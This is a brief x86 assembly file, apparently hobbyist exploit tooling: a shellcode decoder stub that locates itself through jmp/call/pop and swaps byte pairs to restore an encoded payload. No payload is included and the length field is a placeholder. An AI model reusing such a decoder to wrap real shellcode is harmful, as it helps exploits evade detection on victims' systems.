# Coded by Rodrigo Rubira Branco <rodrigo@kernelhacking.com>
# Fixed the zillion shellcode 

BITS 32

jmp short go
next:

pop             esi
xor             ecx,ecx
xor		eax,eax
xor		ebx,ebx
mov             cl,0

change:
mov byte        al,[esi + ecx - 1 ]
mov byte        bl,[esi + ecx - 2 ]
mov byte 	[esi + ecx - 1 ],bl
mov byte        [esi + ecx - 2 ],al
sub		cl,2
jnz change
jmp short ok

go:
call next

ok:

